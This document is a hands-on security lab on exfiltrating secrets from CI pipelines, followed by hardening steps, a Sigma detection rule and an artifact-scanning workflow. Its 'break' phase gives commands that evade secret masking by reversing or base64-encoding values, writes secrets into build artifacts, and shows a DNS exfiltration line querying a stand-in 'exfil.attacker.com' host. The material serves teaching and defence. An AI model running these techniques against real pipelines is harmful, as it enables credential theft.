# Lab 2.4: Secret Exfiltration from CI

<div class="lab-meta">
  <span>~30 minutes</span>
  <span>Intermediate</span>
  <span>Prerequisites: <a href="2.1-cicd-fundamentals.md">Lab 2.1</a></span>
</div>

CI/CD secrets are environment variables. During a pipeline run, build steps can read them, log them, write them to files, and send them over the network. In 2021, a CircleCI breach exposed secrets from thousands of customer projects because build logs and environment variables were accessible beyond their intended scope.

There are at least three distinct exfiltration channels for CI secrets:

1. **Build logs**: `echo $SECRET` prints the value in logs visible to anyone with build access
2. **Artifacts and caches**: Write secrets to a file, upload as a build artifact or cache entry
3. **Network exfiltration**: Base64-encode secrets in DNS queries, HTTP requests, or webhook payloads

Even with "secret masking" enabled (where CI systems replace known secret values with `***` in logs), attackers can bypass it by encoding, splitting, or reversing the secret value before printing.

???+ info "Phase 1: UNDERSTAND. How Secrets Live in CI"

    **Goal:** See how CI secrets are exposed as environment variables during builds.

### Step 1: Examine the CI config

```bash
cd /repos/acme-webapp
cat .gitea/workflows/ci.yml
```

Three secrets are injected globally: `DEPLOY_TOKEN`, `DB_PASSWORD`, `API_KEY`. Every job and step can read them.

### Step 2: Check the build step

Look at the `build` job:

```yaml
- name: Build
  run: |
    echo "Build config: DB=$DB_PASSWORD API=$API_KEY" > dist/build.log
```

This "debug logging" writes secrets to a file that gets uploaded as a build artifact. Anyone who downloads the artifact gets the secrets.

### Step 3: Understand the artifact upload

```yaml
- name: Upload artifact
  uses: actions/upload-artifact@v4
  with:
    path: |
      webapp.tar.gz
      dist/build.log  # <-- contains secrets!
```

The `build.log` file containing secrets is uploaded as a build artifact accessible to anyone with read access to the repository.

???+ warning "Phase 2: BREAK. Three Exfiltration Techniques"

    **Goal:** Exfiltrate secrets via three different channels.

### Technique 1: Build log leakage

The simplest exfiltration. just echo the secret:

```bash
# Simulate what happens during a CI build
export DEPLOY_TOKEN="ghp_deploy_x8k2m5n7p9q1r3t6v0w4y"
export DB_PASSWORD="secret-db_password-7f3a9b2c4d"
export API_KEY="secret-api_key-7f3a9b2c4d"

echo "=== Build Log Exfiltration ==="
echo "DEPLOY_TOKEN=${DEPLOY_TOKEN}"
echo "DB_PASSWORD=${DB_PASSWORD}"
```

In a real CI system, this output appears in the build log. Even with masking, the attacker can bypass it:

```bash
# Bypass secret masking by reversing the value
echo "${DEPLOY_TOKEN}" | rev
# Bypass by base64 encoding
echo "${DEPLOY_TOKEN}" | base64
# Bypass by splitting across lines
echo "${DEPLOY_TOKEN}" | fold -w 10
```

### Technique 2: Artifact exfiltration

Write secrets to a file that gets uploaded as a build artifact:

```bash
mkdir -p dist
echo "DEPLOY_TOKEN=${DEPLOY_TOKEN}" > dist/build.log
echo "DB_PASSWORD=${DB_PASSWORD}" >> dist/build.log
echo "API_KEY=${API_KEY}" >> dist/build.log

echo "=== Artifact created with secrets ==="
cat dist/build.log
echo "This file would be uploaded as a build artifact."
```

Anyone who can download build artifacts (often any repo collaborator) gets the secrets.

### Technique 3: DNS exfiltration

The stealthiest technique. encode secrets in DNS queries:

```bash
# Encode secret as base64 and send via DNS query
ENCODED=$(echo -n "${DEPLOY_TOKEN}" | base64 | tr '+/' '-_' | tr -d '=')
echo "=== DNS Exfiltration ==="
echo "Would execute: dig ${ENCODED}.exfil.attacker.com"
echo "The secret is encoded in the subdomain of the DNS query."
echo "DNS queries are rarely monitored and often bypass egress controls."
```

DNS exfiltration is particularly dangerous because:

- DNS queries are rarely blocked by firewalls
- They do not appear in HTTP proxy logs
- The data is hidden in the subdomain, not the payload
- Many organizations do not monitor DNS content

### Step 4: Check for compromise markers

```bash
if [ -f dist/build.log ] && grep -q "DEPLOY_TOKEN" dist/build.log; then
    echo "COMPROMISED: Secrets found in build artifacts."
fi
```

???+ success "Phase 3: DEFEND. Locking Down CI Secrets"

    **Goal:** Apply secret masking, remove secrets from PR builds, and restrict artifact contents.

### Fix 1: Apply the hardened CI config

```bash
cd /repos/acme-webapp
cp /lab/src/repo/.gitea/workflows/ci-hardened.yml .gitea/workflows/ci.yml

```

Key changes:

1. **No global secrets**. removed the top-level `env:` block entirely
2. **Secrets scoped to deploy only**. `DEPLOY_TOKEN` is only in the deploy step's `env:`
3. **No secrets in artifacts**. build logs do not contain credential values
4. **Secret masking**. the deploy step never echoes raw secret values
5. **PR builds have zero secrets**. separate `pr-ci.yml` for PR validation

### Fix 2: Clean up compromised artifacts

```bash
rm -f dist/build.log
rm -rf dist/
```

### Fix 3: Commit the defense

```bash
git add -A
git commit -m "Remove secrets from build artifacts and scope to deploy only"
git push origin main
```

### Additional defenses

1. **Network egress controls**: Restrict CI runners to only allow outbound connections to known registries and deployment targets
2. **DNS monitoring on runners**: Monitor DNS queries from CI infrastructure for long/encoded subdomains
3. **Artifact scanning**: Scan uploaded artifacts for secret patterns before making them available
4. **Short-lived credentials**: Use OIDC tokens that expire after the pipeline run instead of long-lived secrets
5. **Secret rotation**: Rotate secrets regularly and after any suspected exposure

??? danger "Phase 4: DETECT. Catching Secret Exfiltration"

    **Goal:** Detect all three exfiltration techniques using CI logs, network monitoring, and artifact scanning.

### SIEM / Log Indicators

**Build log exfiltration:**

- Build logs containing strings matching known secret patterns (`ghp_`, `AKIA`, `sk-`, etc.)
- Build logs with base64-encoded strings longer than 40 characters
- Build steps that run `env`, `printenv`, `set`, or echo environment variables

**Artifact exfiltration:**

- Build artifacts containing files named `*.log`, `*.env`, `*.txt` with secret patterns
- Artifact downloads by users who did not trigger the build
- Unusually large artifacts from builds that should produce small outputs

**DNS exfiltration:**

- DNS queries from CI runners with subdomains longer than 30 characters
- DNS queries to domains not in the organization's allowlist
- High volume of DNS queries during a single build step

### Example Detection Queries

**Sigma -- Secret Patterns in CI Build Log Output:**

```yaml
title: Secret Patterns in CI Build Log Output
id: wl-24-e07204f0
status: experimental
description: >
  Detects CI build logs containing credential patterns including AWS keys,
  GitHub tokens, and base64-encoded strings that bypass CI masking.
author: WeakLink Labs
date: 2026/04/04
logsource:
  category: application
  product: ci_cd
detection:
  selection:
    log_message|re: '(AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9_]{36}|password=\\S+|token=\\S+)'
  condition: selection
falsepositives:
  - Test output with example credential patterns
level: critical
tags:
  - attack.t1020
  - attack.exfiltration
```

??? tip "SOC Relevance"

    **Alerts you will see:**

    - "Secret pattern detected in build artifact" (artifact scanning)
    - "Long DNS query from CI runner" (DNS monitoring)
    - "Base64-encoded string in build log from PR build" (log analysis)

    **Why this matters to your SOC:** Secret exfiltration from CI is the objective of most CI/CD attacks. Whether through PPE, injection, or cache poisoning, the end goal is usually to steal credentials. Detecting exfiltration channels (logs, artifacts, DNS, HTTP) is the last line of defense.

    **Triage workflow:**

    1. **Identify the exfiltration channel**. build logs, artifacts, DNS, or HTTP?
    2. **Identify which secrets were exposed**. check environment variables available to the build
    3. **Rotate immediately**. every secret that was in scope during the compromised build
    4. **Audit secret usage**. check if stolen credentials were used to access downstream systems
    5. **Block the channel**. restrict network egress, enable artifact scanning, enforce secret masking

    **False positive rate:** Varies by channel. Build log detection has medium FP rate (developers sometimes print debug info). DNS exfiltration detection has low FP rate (legitimate DNS queries from CI are short). Artifact scanning has low FP rate (secrets in artifacts are always a problem).

??? example "CI Integration"

    **`.github/workflows/secret-leak-scan.yml`:**

    ```yaml
    name: Secret Leak Prevention

    on:
      workflow_run:
        workflows: ["*"]
        types: [completed]

    jobs:
      scan-artifacts:
        runs-on: ubuntu-latest
        steps:
          - name: Download artifacts from triggering workflow
            uses: actions/download-artifact@v4
            with:
              run-id: ${{ github.event.workflow_run.id }}
              path: /tmp/artifacts/

          - name: Scan for secret patterns
            run: |
              echo "--- Scanning build artifacts for leaked secrets ---"
              LEAKED=0
              find /tmp/artifacts/ -type f | while read f; do
                if grep -lqE '(ghp_|AKIA|sk-|password=|token=|secret=)' "$f" 2>/dev/null; then
                  echo "::error::Secret pattern found in artifact: $f"
                  LEAKED=1
                fi
              done
              if [ "$LEAKED" -eq 1 ]; then
                echo "CRITICAL: Secrets detected in build artifacts. Rotate immediately."
                exit 1
              fi
              echo "PASS: No secrets found in artifacts."
    ```

## What You Learned

1. **CI secrets are just environment variables**. any step can read them.
2. **Three exfiltration channels**. build logs, artifacts, and DNS/HTTP all leak secrets.
3. **Secret masking is bypassable**. encoding, splitting, or reversing secrets evades masking.
4. **Scope secrets to the minimum**. only the deploy step should have deployment credentials.
5. **Network egress controls matter**. restrict outbound connections from CI runners.
6. **Artifact scanning is a last line of defense**. catch secrets that made it into build outputs.
